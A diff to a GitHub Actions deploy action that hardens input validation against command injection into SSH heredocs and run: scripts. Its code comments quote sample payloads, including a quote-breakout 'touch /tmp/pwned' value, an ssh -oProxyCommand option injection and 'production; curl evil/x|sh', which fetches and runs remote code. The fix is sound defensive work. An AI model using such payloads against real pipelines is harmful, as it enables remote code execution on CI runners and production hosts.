@@ -63,6 +63,8 @@ runs:
         INPUT_TS_OAUTH_CLIENT_ID: ${{ inputs.ts_oauth_client_id }}
         INPUT_TS_OAUTH_SECRET: ${{ inputs.ts_oauth_secret }}
         INPUT_TARGET: ${{ inputs.target }}
+        INPUT_REMOTE_PATH: ${{ inputs.remote_path }}
+        INPUT_TARGET_ENVIRONMENT: ${{ inputs.target_environment }}
       run: |
         set -euo pipefail
         if [ -z "$INPUT_TS_OAUTH_CLIENT_ID" ] || [ -z "$INPUT_TS_OAUTH_SECRET" ]; then
@@ -74,13 +76,51 @@ runs:
             echo "❌ Missing required input '${var_name}' for target '${INPUT_TARGET}'."
             exit 1
           fi
+          # A leading '-' would be parsed by ssh as an option, not a destination
+          # (e.g. -oProxyCommand=...). Charset-restrict both while we are here.
+          if [[ ! "${!var_name}" =~ ^[A-Za-z0-9][A-Za-z0-9._@-]*$ ]]; then
+            echo "❌ Invalid '${var_name}' value '${!var_name}' (expected [A-Za-z0-9._@-], not starting with '-')."
+            exit 1
+          fi
         done
+        # remote_path is interpolated as `cd "${REMOTE_PATH}"` inside the same
+        # unquoted SSH heredoc as COMPOSE_PROFILES below, so it is the identical
+        # injection class and was previously validated NOT AT ALL: a value like
+        # '/srv/x"; touch /tmp/pwned; echo "' broke out of the quotes and ran on
+        # the production host. Absolute path, conservative charset, no line breaks.
+        if [[ ! "$INPUT_REMOTE_PATH" =~ ^/[A-Za-z0-9._/-]*$ ]] || [[ "$INPUT_REMOTE_PATH" == *".."* ]]; then
+          echo "❌ Invalid 'remote_path' value '$INPUT_REMOTE_PATH' (expected an absolute path over [A-Za-z0-9._/-], no '..')."
+          exit 1
+        fi
+        # target_environment selects the generate-env profile AND is the value that
+        # used to be interpolated raw into the "Generate .env" run: body. It now
+        # goes through an env var there, but keep it allowlisted anyway: it decides
+        # which environment's secrets get written, so a typo must fail loudly
+        # rather than silently produce the wrong .env on a production host.
+        if [[ ! "$INPUT_TARGET_ENVIRONMENT" =~ ^(production|staging)$ ]]; then
+          echo "❌ Invalid 'target_environment' value '$INPUT_TARGET_ENVIRONMENT' (allowed: production, staging)."
+          exit 1
+        fi
         # Comma-separated list allowed (Docker Compose reads COMPOSE_PROFILES the
         # same way), so one server can activate several profiles -- e.g. "main,geo"
         # for the single prod host that carries the Valhalla tile data, while the
-        # other "main" hosts stay without it. Still a strict allowlist: every
-        # element must match, so no shell metacharacters can reach the SSH heredoc.
-        printf '%s' "$INPUT_COMPOSE_PROFILES" | grep -qE '^(main|staging|monitoring|geo)(,(main|staging|monitoring|geo))*$' || {
+        # other "main" hosts stay without it.
+        #
+        # Matched with bash [[ =~ ]], NOT `grep -qE`: grep matches LINE BY LINE, so
+        # a multi-line value whose first line is a valid profile passes while the
+        # remaining lines carry anything at all. This value is interpolated into an
+        # unquoted `ssh ... bash <<EOF` heredoc below, so that was a command
+        # injection path into the deploy shell on production hosts. Verified:
+        # printf 'main\n"; touch /tmp/pwned; echo "\n' | grep -qE '<pattern>' matched;
+        # the same payload is rejected here. The explicit newline check is kept in
+        # front of the regex so the guarantee does not rest on a regex subtlety.
+        case "$INPUT_COMPOSE_PROFILES" in
+          *$'\n'*|*$'\r'*)
+            echo "❌ 'compose_profiles' must not contain line breaks."
+            exit 1
+            ;;
+        esac
+        [[ "$INPUT_COMPOSE_PROFILES" =~ ^(main|staging|monitoring|geo)(,(main|staging|monitoring|geo))*$ ]] || {
           echo "❌ Invalid 'compose_profiles' input '$INPUT_COMPOSE_PROFILES' (allowed: comma-separated list of main, staging, monitoring, geo)"
           exit 1
         }
@@ -103,6 +143,11 @@ runs:
       shell: bash
       env:
         SECRETS_CONTEXT_RAW: ${{ inputs.secrets_context_json }}
+        # Via env, NOT a raw ${{ }} expression in the run: body. A raw expression
+        # is substituted into the script text BEFORE bash parses it, so a value
+        # like "production; curl evil/x|sh" would execute on the runner itself.
+        # Validated against an allowlist in the "Validate inputs" step above.
+        TARGET_ENVIRONMENT: ${{ inputs.target_environment }}
       run: |
         set -euo pipefail
         # S5/S21 partial mitigation: drop CI-only secret families before
@@ -116,7 +161,7 @@ runs:
         )
         unset SECRETS_CONTEXT_RAW
         export SECRETS_CONTEXT
-        generate-env --env ${{ inputs.target_environment }} --config project.yaml
+        generate-env --env "${TARGET_ENVIRONMENT}" --config project.yaml
 
     - name: 🔌 Pre-flight Tailscale-SSH connectivity check
       shell: bash
